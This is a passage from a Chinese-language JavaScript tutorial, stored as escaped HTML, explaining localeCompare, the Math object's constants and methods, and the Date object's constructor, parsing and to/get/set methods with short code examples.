码点比较，<code>B</code>的码点是66，而<code>a</code>的码点是97。</p>\n<p>但是，<code>localeCompare</code>方法会考虑自然语言的排序情况，将<code>B</code>排在<code>a</code>的前面。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;B&#039;.localeCompare(&#039;a&#039;) // 1</code></pre><p>上面代码中，<code>localeCompare</code>方法返回整数1，表示<code>B</code>较大。</p>\n<p><code>localeCompare</code>还可以有第二个参数，指定所使用的语言（默认是英语），然后根据该语言的规则进行比较。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;ä&#039;.localeCompare(&#039;z&#039;, &#039;de&#039;) // -1\n&#039;ä&#039;.localeCompare(&#039;z&#039;, &#039;sv&#039;) // 1</code></pre><p>上面代码中，<code>de</code>表示德语，<code>sv</code>表示瑞典语。德语中，<code>ä</code>小于<code>z</code>，所以返回<code>-1</code>；瑞典语中，<code>ä</code>大于<code>z</code>，所以返回<code>1</code>。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Ariya Hidayat, <a href=\"http://ariya.ofilabs.com/2014/02/javascript-string-substring-substr-slice.html\">JavaScript String: substring, substr, slice</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"Math 对象","link":"/stdlib/math.html"}],"content":"\n        <h1>\n            <a href='#Math-对象' class='header-anchor'>#</a>\n            <span>Math 对象</span>\n        </h1>\n    <p><code>Math</code>是 JavaScript 的原生对象，提供各种数学功能。该对象不是构造函数，不能生成实例，所有的属性和方法都必须在<code>Math</code>对象上调用。</p>\n\n        <h2>\n            <a href='#静态属性' class='header-anchor'>#</a>\n            <span>静态属性</span>\n        </h2>\n    <p><code>Math</code>对象的静态属性，提供以下一些数学常数。</p>\n<ul>\n<li><code>Math.E</code>：常数<code>e</code>。</li>\n<li><code>Math.LN2</code>：2 的自然对数。</li>\n<li><code>Math.LN10</code>：10 的自然对数。</li>\n<li><code>Math.LOG2E</code>：以 2 为底的<code>e</code>的对数。</li>\n<li><code>Math.LOG10E</code>：以 10 为底的<code>e</code>的对数。</li>\n<li><code>Math.PI</code>：常数 Pi。</li>\n<li><code>Math.SQRT1_2</code>：0.5 的平方根。</li>\n<li><code>Math.SQRT2</code>：2 的平方根。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>Math.E // 2.718281828459045\nMath.LN2 // 0.6931471805599453\nMath.LN10 // 2.302585092994046\nMath.LOG2E // 1.4426950408889634\nMath.LOG10E // 0.4342944819032518\nMath.PI // 3.141592653589793\nMath.SQRT1_2 // 0.7071067811865476\nMath.SQRT2 // 1.4142135623730951</code></pre><p>这些属性都是只读的，不能修改。</p>\n\n        <h2>\n            <a href='#静态方法' class='header-anchor'>#</a>\n            <span>静态方法</span>\n        </h2>\n    <p><code>Math</code>对象提供以下一些静态方法。</p>\n<ul>\n<li><code>Math.abs()</code>：绝对值</li>\n<li><code>Math.ceil()</code>：向上取整</li>\n<li><code>Math.floor()</code>：向下取整</li>\n<li><code>Math.max()</code>：最大值</li>\n<li><code>Math.min()</code>：最小值</li>\n<li><code>Math.pow()</code>：指数运算</li>\n<li><code>Math.sqrt()</code>：平方根</li>\n<li><code>Math.log()</code>：自然对数</li>\n<li><code>Math.exp()</code>：e的指数</li>\n<li><code>Math.round()</code>：四舍五入</li>\n<li><code>Math.random()</code>：随机数</li>\n</ul>\n\n        <h3>\n            <a href='#Math.abs()' class='header-anchor'>#</a>\n            <span>Math.abs()</span>\n        </h3>\n    <p><code>Math.abs</code>方法返回参数值的绝对值。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.abs(1) // 1\nMath.abs(-1) // 1</code></pre>\n        <h3>\n            <a href='#Math.max()，Math.min()' class='header-anchor'>#</a>\n            <span>Math.max()，Math.min()</span>\n        </h3>\n    <p><code>Math.max</code>方法返回参数之中最大的那个值，<code>Math.min</code>返回最小的那个值。如果参数为空, <code>Math.min</code>返回<code>Infinity</code>, <code>Math.max</code>返回<code>-Infinity</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.max(2, -1, 5) // 5\nMath.min(2, -1, 5) // -1\nMath.min() // Infinity\nMath.max() // -Infinity</code></pre>\n        <h3>\n            <a href='#Math.floor()，Math.ceil()' class='header-anchor'>#</a>\n            <span>Math.floor()，Math.ceil()</span>\n        </h3>\n    <p><code>Math.floor</code>方法返回小于参数值的最大整数（地板值）。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.floor(3.2) // 3\nMath.floor(-3.2) // -4</code></pre><p><code>Math.ceil</code>方法返回大于参数值的最小整数（天花板值）。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.ceil(3.2) // 4\nMath.ceil(-3.2) // -3</code></pre><p>这两个方法可以结合起来，实现一个总是返回数值的整数部分的函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function ToInteger(x) {\n  x = Number(x);\n  return x &lt; 0 ? Math.ceil(x) : Math.floor(x);\n}\n\nToInteger(3.2) // 3\nToInteger(3.5) // 3\nToInteger(3.8) // 3\nToInteger(-3.2) // -3\nToInteger(-3.5) // -3\nToInteger(-3.8) // -3</code></pre><p>上面代码中，不管正数或负数，<code>ToInteger</code>函数总是返回一个数值的整数部分。</p>\n\n        <h3>\n            <a href='#Math.round()' class='header-anchor'>#</a>\n            <span>Math.round()</span>\n        </h3>\n    <p><code>Math.round</code>方法用于四舍五入。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.round(0.1) // 0\nMath.round(0.5) // 1\nMath.round(0.6) // 1\n\n// 等同于\nMath.floor(x + 0.5)</code></pre><p>注意，它对负数的处理（主要是对<code>0.5</code>的处理）。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.round(-1.1) // -1\nMath.round(-1.5) // -1\nMath.round(-1.6) // -2</code></pre>\n        <h3>\n            <a href='#Math.pow()' class='header-anchor'>#</a>\n            <span>Math.pow()</span>\n        </h3>\n    <p><code>Math.pow</code>方法返回以第一个参数为底数、第二个参数为幂的指数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 等同于 2 ** 2\nMath.pow(2, 2) // 4\n// 等同于 2 ** 3\nMath.pow(2, 3) // 8</code></pre><p>下面是计算圆面积的方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var radius = 20;\nvar area = Math.PI * Math.pow(radius, 2);</code></pre>\n        <h3>\n            <a href='#Math.sqrt()' class='header-anchor'>#</a>\n            <span>Math.sqrt()</span>\n        </h3>\n    <p><code>Math.sqrt</code>方法返回参数值的平方根。如果参数是一个负值，则返回<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.sqrt(4) // 2\nMath.sqrt(-4) // NaN</code></pre>\n        <h3>\n            <a href='#Math.log()' class='header-anchor'>#</a>\n            <span>Math.log()</span>\n        </h3>\n    <p><code>Math.log</code>方法返回以<code>e</code>为底的自然对数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.log(Math.E) // 1\nMath.log(10) // 2.302585092994046</code></pre><p>如果要计算以10为底的对数，可以先用<code>Math.log</code>求出自然对数，然后除以<code>Math.LN10</code>；求以2为底的对数，可以除以<code>Math.LN2</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.log(100)/Math.LN10 // 2\nMath.log(8)/Math.LN2 // 3</code></pre>\n        <h3>\n            <a href='#Math.exp()' class='header-anchor'>#</a>\n            <span>Math.exp()</span>\n        </h3>\n    <p><code>Math.exp</code>方法返回常数<code>e</code>的参数次方。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.exp(1) // 2.718281828459045\nMath.exp(3) // 20.085536923187668</code></pre>\n        <h3>\n            <a href='#Math.random()' class='header-anchor'>#</a>\n            <span>Math.random()</span>\n        </h3>\n    <p><code>Math.random()</code>返回0到1之间的一个伪随机数，可能等于0，但是一定小于1。</p>\n<pre class=\"prettyprint language-javascript\"><code>Math.random() // 0.7151307314634323</code></pre><p>任意范围的随机数生成函数如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>function getRandomArbitrary(min, max) {\n  return Math.random() * (max - min) + min;\n}\n\ngetRandomArbitrary(1.5, 6.5)\n// 2.4942810038223864</code></pre><p>任意范围的随机整数生成函数如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>function getRandomInt(min, max) {\n  return Math.floor(Math.random() * (max - min + 1)) + min;\n}\n\ngetRandomInt(1, 6) // 5</code></pre><p>返回随机字符的例子如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>function random_str(length) {\n  var ALPHABET = &#039;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#039;;\n  ALPHABET += &#039;abcdefghijklmnopqrstuvwxyz&#039;;\n  ALPHABET += &#039;0123456789-_&#039;;\n  var str = &#039;&#039;;\n  for (var i=0; i &lt; length; ++i) {\n    var rand = Math.floor(Math.random() * ALPHABET.length);\n    str += ALPHABET.substring(rand, rand + 1);\n  }\n  return str;\n}\n\nrandom_str(6) // &quot;NdQKOr&quot;</code></pre><p>上面代码中，<code>random_str</code>函数接受一个整数作为参数，返回变量<code>ALPHABET</code>内的随机字符所组成的指定长度的字符串。</p>\n\n        <h3>\n            <a href='#三角函数方法' class='header-anchor'>#</a>\n            <span>三角函数方法</span>\n        </h3>\n    <p><code>Math</code>对象还提供一系列三角函数方法。</p>\n<ul>\n<li><code>Math.sin()</code>：返回参数的正弦（参数为弧度值）</li>\n<li><code>Math.cos()</code>：返回参数的余弦（参数为弧度值）</li>\n<li><code>Math.tan()</code>：返回参数的正切（参数为弧度值）</li>\n<li><code>Math.asin()</code>：返回参数的反正弦（返回值为弧度值）</li>\n<li><code>Math.acos()</code>：返回参数的反余弦（返回值为弧度值）</li>\n<li><code>Math.atan()</code>：返回参数的反正切（返回值为弧度值）</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>Math.sin(0) // 0\nMath.cos(0) // 1\nMath.tan(0) // 0\n\nMath.sin(Math.PI / 2) // 1\n\nMath.asin(1) // 1.5707963267948966\nMath.acos(1) // 0\nMath.atan(1) // 0.7853981633974483</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"Date 对象","link":"/stdlib/date.html"}],"content":"\n        <h1>\n            <a href='#Date-对象' class='header-anchor'>#</a>\n            <span>Date 对象</span>\n        </h1>\n    <p><code>Date</code>对象是 JavaScript 原生的时间库。它以1970年1月1日00:00:00作为时间的零点，可以表示的时间范围是前后各1亿天（单位为毫秒）。</p>\n\n        <h2>\n            <a href='#普通函数的用法' class='header-anchor'>#</a>\n            <span>普通函数的用法</span>\n        </h2>\n    <p><code>Date</code>对象可以作为普通函数直接调用，返回一个代表当前时间的字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>Date()\n// &quot;Tue Dec 01 2015 09:34:43 GMT+0800 (CST)&quot;</code></pre><p>注意，即使带有参数，<code>Date</code>作为普通函数使用时，返回的还是当前时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>Date(2000, 1, 1)\n// &quot;Tue Dec 01 2015 09:34:43 GMT+0800 (CST)&quot;</code></pre><p>上面代码说明，无论有没有参数，直接调用<code>Date</code>总是返回当前时间。</p>\n\n        <h2>\n            <a href='#构造函数的用法' class='header-anchor'>#</a>\n            <span>构造函数的用法</span>\n        </h2>\n    <p><code>Date</code>还可以当作构造函数使用。对它使用<code>new</code>命令，会返回一个<code>Date</code>对象的实例。如果不加参数，实例代表的就是当前时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>var today = new Date();</code></pre><p><code>Date</code>实例有一个独特的地方。其他对象求值的时候，都是默认调用<code>.valueOf()</code>方法，但是<code>Date</code>实例求值的时候，默认调用的是<code>toString()</code>方法。这导致对<code>Date</code>实例求值，返回的是一个字符串，代表该实例对应的时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>var today = new Date();\n\ntoday\n// &quot;Tue Dec 01 2015 09:34:43 GMT+0800 (CST)&quot;\n\n// 等同于\ntoday.toString()\n// &quot;Tue Dec 01 2015 09:34:43 GMT+0800 (CST)&quot;</code></pre><p>上面代码中，<code>today</code>是<code>Date</code>的实例，直接求值等同于调用<code>toString</code>方法。</p>\n<p>作为构造函数时，<code>Date</code>对象可以接受多种格式的参数，返回一个该参数对应的时间实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 参数为时间零点开始计算的毫秒数\nnew Date(1378218728000)\n// Tue Sep 03 2013 22:32:08 GMT+0800 (CST)\n\n// 参数为日期字符串\nnew Date(&#039;January 6, 2013&#039;);\n// Sun Jan 06 2013 00:00:00 GMT+0800 (CST)\n\n// 参数为多个整数，\n// 代表年、月、日、小时、分钟、秒、毫秒\nnew Date(2013, 0, 1, 0, 0, 0, 0)\n// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)</code></pre><p>关于<code>Date</code>构造函数的参数，有几点说明。</p>\n<p>第一点，参数可以是负整数，代表1970年元旦之前的时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Date(-1378218728000)\n// Fri Apr 30 1926 17:27:52 GMT+0800 (CST)</code></pre><p>第二点，只要是能被<code>Date.parse()</code>方法解析的字符串，都可以当作参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Date(&#039;2013-2-15&#039;)\nnew Date(&#039;2013/2/15&#039;)\nnew Date(&#039;02/15/2013&#039;)\nnew Date(&#039;2013-FEB-15&#039;)\nnew Date(&#039;FEB, 15, 2013&#039;)\nnew Date(&#039;FEB 15, 2013&#039;)\nnew Date(&#039;Feberuary, 15, 2013&#039;)\nnew Date(&#039;Feberuary 15, 2013&#039;)\nnew Date(&#039;15 Feb 2013&#039;)\nnew Date(&#039;15, Feberuary, 2013&#039;)\n// Fri Feb 15 2013 00:00:00 GMT+0800 (CST)</code></pre><p>上面多种日期字符串的写法，返回的都是同一个时间。</p>\n<p>第三，参数为年、月、日等多个整数时，年和月是不能省略的，其他参数都可以省略的。也就是说，这时至少需要两个参数，因为如果只使用“年”这一个参数，<code>Date</code>会将其解释为毫秒数。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Date(2013)\n// Thu Jan 01 1970 08:00:02 GMT+0800 (CST)</code></pre><p>上面代码中，2013被解释为毫秒数，而不是年份。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Date(2013, 0)\n// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)\nnew Date(2013, 0, 1)\n// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)\nnew Date(2013, 0, 1, 0)\n// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)\nnew Date(2013, 0, 1, 0, 0, 0, 0)\n// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)</code></pre><p>上面代码中，不管有几个参数，返回的都是2013年1月1日零点。</p>\n<p>最后，各个参数的取值范围如下。</p>\n<ul>\n<li>年：使用四位数年份，比如<code>2000</code>。如果写成两位数或个位数，则加上<code>1900</code>，即<code>10</code>代表1910年。如果是负数，表示公元前。</li>\n<li>月：<code>0</code>表示一月，依次类推，<code>11</code>表示12月。</li>\n<li>日：<code>1</code>到<code>31</code>。</li>\n<li>小时：<code>0</code>到<code>23</code>。</li>\n<li>分钟：<code>0</code>到<code>59</code>。</li>\n<li>秒：<code>0</code>到<code>59</code></li>\n<li>毫秒：<code>0</code>到<code>999</code>。</li>\n</ul>\n<p>注意，月份从<code>0</code>开始计算，但是，天数从<code>1</code>开始计算。另外，除了日期的默认值为<code>1</code>，小时、分钟、秒钟和毫秒的默认值都是<code>0</code>。</p>\n<p>这些参数如果超出了正常范围，会被自动折算。比如，如果月设为<code>15</code>，就折算为下一年的4月。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Date(2013, 15)\n// Tue Apr 01 2014 00:00:00 GMT+0800 (CST)\nnew Date(2013, 0, 0)\n// Mon Dec 31 2012 00:00:00 GMT+0800 (CST)</code></pre><p>上面代码的第二个例子，日期设为<code>0</code>，就代表上个月的最后一天。</p>\n<p>参数还可以使用负数，表示扣去的时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Date(2013, -1)\n// Sat Dec 01 2012 00:00:00 GMT+0800 (CST)\nnew Date(2013, 0, -1)\n// Sun Dec 30 2012 00:00:00 GMT+0800 (CST)</code></pre><p>上面代码中，分别对月和日使用了负数，表示从基准日扣去相应的时间。</p>\n\n        <h2>\n            <a href='#日期的运算' class='header-anchor'>#</a>\n            <span>日期的运算</span>\n        </h2>\n    <p>类型自动转换时，<code>Date</code>实例如果转为数值，则等于对应的毫秒数；如果转为字符串，则等于对应的日期字符串。所以，两个日期实例对象进行减法运算时，返回的是它们间隔的毫秒数；进行加法运算时，返回的是两个字符串连接而成的新字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d1 = new Date(2000, 2, 1);\nvar d2 = new Date(2000, 3, 1);\n\nd2 - d1\n// 2678400000\nd2 + d1\n// &quot;Sat Apr 01 2000 00:00:00 GMT+0800 (CST)Wed Mar 01 2000 00:00:00 GMT+0800 (CST)&quot;</code></pre>\n        <h2>\n            <a href='#静态方法' class='header-anchor'>#</a>\n            <span>静态方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#Date.now()' class='header-anchor'>#</a>\n            <span>Date.now()</span>\n        </h3>\n    <p><code>Date.now</code>方法返回当前时间距离时间零点（1970年1月1日 00:00:00 UTC）的毫秒数，相当于 Unix 时间戳乘以1000。</p>\n<pre class=\"prettyprint language-javascript\"><code>Date.now() // 1364026285194</code></pre>\n        <h3>\n            <a href='#Date.parse()' class='header-anchor'>#</a>\n            <span>Date.parse()</span>\n        </h3>\n    <p><code>Date.parse</code>方法用来解析日期字符串，返回该时间距离时间零点（1970年1月1日 00:00:00）的毫秒数。</p>\n<p>日期字符串应该符合 RFC 2822 和 ISO 8061 这两个标准，即<code>YYYY-MM-DDTHH:mm:ss.sssZ</code>格式，其中最后的<code>Z</code>表示时区。但是，其他格式也可以被解析，请看下面的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>Date.parse(&#039;Aug 9, 1995&#039;)\nDate.parse(&#039;January 26, 2011 13:51:50&#039;)\nDate.parse(&#039;Mon, 25 Dec 1995 13:30:00 GMT&#039;)\nDate.parse(&#039;Mon, 25 Dec 1995 13:30:00 +0430&#039;)\nDate.parse(&#039;2011-10-10&#039;)\nDate.parse(&#039;2011-10-10T14:48:00&#039;)</code></pre><p>上面的日期字符串都可以解析。</p>\n<p>如果解析失败，返回<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Date.parse(&#039;xxx&#039;) // NaN</code></pre>\n        <h3>\n            <a href='#Date.UTC()' class='header-anchor'>#</a>\n            <span>Date.UTC()</span>\n        </h3>\n    <p><code>Date.UTC</code>方法接受年、月、日等变量作为参数，返回该时间距离时间零点（1970年1月1日 00:00:00 UTC）的毫秒数。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 格式\nDate.UTC(year, month[, date[, hrs[, min[, sec[, ms]]]]])\n\n// 用法\nDate.UTC(2011, 0, 1, 2, 3, 4, 567)\n// 1293847384567</code></pre><p>该方法的参数用法与<code>Date</code>构造函数完全一致，比如月从<code>0</code>开始计算，日期从<code>1</code>开始计算。区别在于<code>Date.UTC</code>方法的参数，会被解释为 UTC 时间（世界标准时间），<code>Date</code>构造函数的参数会被解释为当前时区的时间。</p>\n\n        <h2>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h2>\n    <p><code>Date</code>的实例对象，有几十个自己的方法，除了<code>valueOf</code>和<code>toString</code>，可以分为以下三类。</p>\n<ul>\n<li><code>to</code>类：从<code>Date</code>对象返回一个字符串，表示指定的时间。</li>\n<li><code>get</code>类：获取<code>Date</code>对象的日期和时间。</li>\n<li><code>set</code>类：设置<code>Date</code>对象的日期和时间。</li>\n</ul>\n\n        <h3>\n            <a href='#Date.prototype.valueOf()' class='header-anchor'>#</a>\n            <span>Date.prototype.valueOf()</span>\n        </h3>\n    <p><code>valueOf</code>方法返回实例对象距离时间零点（1970年1月1日00:00:00 UTC）对应的毫秒数，该方法等同于<code>getTime</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date();\n\nd.valueOf() // 1362790014817\nd.getTime() // 1362790014817</code></pre><p>预期为数值的场合，<code>Date</code>实例会自动调用该方法，所以可以用下面的方法计算时间的间隔。</p>\n<pre class=\"prettyprint language-javascript\"><code>var start = new Date();\n// ...\nvar end = new Date();\nvar elapsed = end - start;</code></pre>\n        <h3>\n            <a href='#to-类方法' class='header-anchor'>#</a>\n            <span>to 类方法</span>\n        </h3>\n    <p><strong>（1）Date.prototype.toString()</strong></p>\n<p><code>toString</code>方法返回一个完整的日期字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\n\nd.toString()\n// &quot;Tue Jan 01 2013 00:00:00 GMT+0800 (CST)&quot;\nd\n// &quot;Tue Jan 01 2013 00:00:00 GMT+0800 (CST)&quot;</code></pre><p>因为<code>toString</code>是默认的调用方法，所以如果直接读取<code>Date</code>实例，就相当于调用这个方法。</p>\n<p><strong>（2）Date.prototype.toUTCString()</strong></p>\n<p><code>toUTCString</code>方法返回对应的 UTC 时间，也就是比北京时间晚8个小时。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\n\nd.toUTCString()\n// &quot;Mon, 31 Dec 2012 16:00:00 GMT&quot;</code></pre><p><strong>（3）Date.prototype.toISOString()</strong></p>\n<p><code>toISOString</code>方法返回对应时间的 ISO8601 写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\n\nd.toISOString()\n// &quot;2012-12-31T16:00:00.000Z&quot;</code></pre><p>注意，<code>toISOString</code>方法返回的总是 UTC 时区的时间。</p>\n<p><strong>（4）Date.prototype.toJSON()</strong></p>\n<p><code>toJSON</code>方法返回一个符合 JSON 格式的 ISO 日期字符串，与<code>toISOString</code>方法的返回结果完全相同。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\n\nd.toJSON()\n// &quot;2012-12-31T16:00:00.000Z&quot;</code></pre><p><strong>（5）Date.prototype.toDateString()</strong></p>\n<p><code>toDateString</code>方法返回日期字符串（不含小时、分和秒）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\nd.toDateString() // &quot;Tue Jan 01 2013&quot;</code></pre><p><strong>（6）Date.prototype.toTimeString()</strong></p>\n<p><code>toTimeString</code>方法返回时间字符串（不含年月日）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\nd.toTimeString() // &quot;00:00:00 GMT+0800 (CST)&quot;</code></pre><p><strong>（7）Date.prototype.toLocaleDateString()</strong></p>\n<p><code>toLocaleDateString</code>方法返回一个字符串，代表日期的当地写法（不含小时、分和秒）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\n\nd.toLocaleDateString()\n// 中文版浏览器为&quot;2013年1月1日&quot;\n// 英文版浏览器为&quot;1/1/2013&quot;</code></pre><p><strong>（8）Date.prototype.toLocaleTimeString()</strong></p>\n<p><code>toLocaleTimeString</code>方法返回一个字符串，代表时间的当地写法（不含年月日）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(2013, 0, 1);\n\nd.toLocaleTimeString()\n// 中文版浏览器为&quot;上午12:00:00&quot;\n// 英文版浏览器为&quot;12:00:00 AM&quot;</code></pre>\n        <h3>\n            <a href='#get-类方法' class='header-anchor'>#</a>\n            <span>get 类方法</span>\n        </h3>\n    <p><code>Date</code>对象提供了一系列<code>get*</code>方法，用来获取实例对象某个方面的值。</p>\n<ul>\n<li><code>getTime()</code>：返回实例距离1970年1月1日00:00:00的毫秒数，等同于<code>valueOf</code>方法。</li>\n<li><code>getDate()</code>：返回实例对象对应每个月的几号（从1开始）。</li>\n<li><code>getDay()</code>：返回星期几，星期日为0，星期一为1，以此类推。</li>\n<li><code>getYear()</code>：返回距离1900的年数。</li>\n<li><code>getFullYear()</code>：返回四位的年份。</li>\n<li><code>getMonth()</code>：返回月份（0表示1月，11表示12月）。</li>\n<li><code>getHours()</code>：返回小时（0-23）。</li>\n<li><code>getMilliseconds()</code>：返回毫秒（0-999）。</li>\n<li><code>getMinutes()</code>：返回分钟（0-59）。</li>\n<li><code>getSeconds()</code>：返回秒（0-59）。</li>\n<li><code>getTimezoneOffset()</code>：返回当前时间与 UTC 的时区差异，以分钟表示，返回结果考虑到了夏令时因素。</li>\n</ul>\n<p>所有这些<code>get*</code>方法返回的都是整数，不同方法返回值的范围不一样。</p>\n<ul>\n<li>分钟和秒：0 到 59</li>\n<li>小时：0 到 23</li>\n<li>星期：0（星期天）到 6（星期六）</li>\n<li>日期：1 到 31</li>\n<li>月份：0（一月）到 11（十二月）</li>\n<li>年份：距离1900年的年数</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(&#039;January 6, 2013&#039;);\n\nd.getDate() // 6\nd.getMonth() // 0\nd.getYear() // 113\nd.getFullYear() // 2013\nd.getTimezoneOffset() // -480</code></pre><p>上面代码中，最后一行返回<code>-480</code>，即 UTC 时间减去当前时间，单位是分钟。<code>-480</code>表示 UTC 比当前时间少480分钟，即当前时区比 UTC 早8个小时。</p>\n<p>下面是一个例子，计算本年度还剩下多少天。</p>\n<pre class=\"prettyprint language-javascript\"><code>function leftDays() {\n  var today = new Date();\n  var endYear = new Date(today.getFullYear(), 11, 31, 23, 59, 59, 999);\n  var msPerDay = 24 * 60 * 60 * 1000;\n  return Math.round((endYear.getTime() - today.getTime()) / msPerDay);\n}</code></pre><p>上面这些<code>get*</code>方法返回的都是当前时区的时间，<code>Date</code>对象还提供了这些方法对应的 UTC 版本，用来返回 UTC 时间。</p>\n<ul>\n<li><code>getUTCDate()</code></li>\n<li><code>getUTCFullYear()</code></li>\n<li><code>getUTCMonth()</code></li>\n<li><code>getUTCDay()</code></li>\n<li><code>getUTCHours()</code></li>\n<li><code>getUTCMinutes()</code></li>\n<li><code>getUTCSeconds()</code></li>\n<li><code>getUTCMilliseconds()</code></li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(&#039;January 6, 2013&#039;);\n\nd.getDate() // 6\nd.getUTCDate() // 5</code></pre><p>上面代码中，实例对象<code>d</code>表示当前时区（东八时区）的1月6日0点0分0秒，这个时间对于当前时区来说是1月6日，所以<code>getDate</code>方法返回6，对于 UTC 时区来说是1月5日，所以<code>getUTCDate</code>方法返回5。</p>\n\n        <h3>\n            <a href='#set-类方法' class='header-anchor'>#</a>\n            <span>set 类方法</span>\n        </h3>\n    <p><code>Date</code>对象提供了一系列<code>set*</code>方法，用来设置实例对象的各个方面。</p>\n<ul>\n<li><code>setDate(date)</code>：设置实例对象对应的每个月的几号（1-31），返回改变后毫秒时间戳。</li>\n<li><code>setYear(year)</code>: 设置距离1900年的年数。</li>\n<li><code>setFullYear(year [, month, date])</code>：设置四位年份。</li>\n<li><code>setHours(hour [, min, sec, ms])</code>：设置小时（0-23）。</li>\n<li><code>setMilliseconds()</code>：设置毫秒（0-999）。</li>\n<li><code>setMinutes(min [, sec, ms])</code>：设置分钟（0-59）。</li>\n<li><code>setMonth(month [, date])</code>：设置月份（0-11）。</li>\n<li><code>setSeconds(sec [, ms])</code>：设置秒（0-59）。</li>\n<li><code>setTime(milliseconds)</code>：设置毫秒时间戳。</li>\n</ul>\n<p>这些方法基本是跟<code>get*</code>方法一一对应的，但是没有<code>setDay</code>方法，因为星期几是计算出来的，而不是设置的。另外，需要注意的是，凡是涉及到设置月份，都是从0开始算的，即<code>0</code>是1月，<code>11</code>是12月。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date (&#039;January 6, 2013&#039;);\n\nd // Sun Jan 06 2013 00:00:00 GMT+0800 (CST)\nd.setDate(9) // 1357660800000\nd // Wed Jan 09 2013 00:00:00 GMT+0800 (CST)</code></pre><p><code>set*</code>方法的参数都会自动折算。以<code>setDate</code>为例，如果参数超过当月的最大天数，则向下一个月顺延，如果参数是负数，表示从上个月的最后一天开始减去的天数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d1 = new Date(&#039;January 6, 2013&#039;);\n\nd1.setDate(32) // 1359648000000\nd1 // Fri Feb 01 2013 00:00:00 GMT+0800 (CST)\n\nvar d2 = new Date (&#039;January 6, 2013&#039;);\n\nd.setDate(-1) // 1356796800000\nd // Sun Dec 30 2012 00:00:00 GMT+0800 (CST)</code></pre><p><code>set</code>类方法和<code>get</code>类方法，可以结合使用，得到相对时间。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date();\n\n// 将日期向后推1000天\nd.setDate(d.getDate() + 1000);\n// 将时间设为6小时后\nd.setHours(d.getHours() + 6);\n// 将年份设为去年\nd.setFullYear(d.getFullYear() - 1);</code></pre><p><code>set*</code>系列方法除了<code>setTime()</code>和<code>setYear()</code>，都有对应的 UTC 版本，即设置 UTC 时区的时间。</p>\n<ul>\n<li><code>setUTCDate()</code></li>\n<li><code>setUTCFullYear()</code></li>\n<li><code>setUTCHours()</code></li>\n<li><code>setUTCMilliseconds()</code></li>\n<li><code>setUTCMinutes()</code></li>\n<li><code>setUTCMonth()</code></li>\n<li><code>setUTCSeconds()</code></li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date(&#039;January 6, 2013&#039;);\nd.getUTCHours() // 16\nd.setUTCHours(22) // 1357423200000\nd // Sun Jan 06 2013 06:00:00 GMT+0800 (CST)</code></pre><p>上面代码中，本地时区（东八时区）的1月6日0点0分，是 UTC 时区的前一天下午16点。设为 UTC 时区的22点以后，就变为本地时区的上午6点。</p>\n\n        <h2>\n            <a 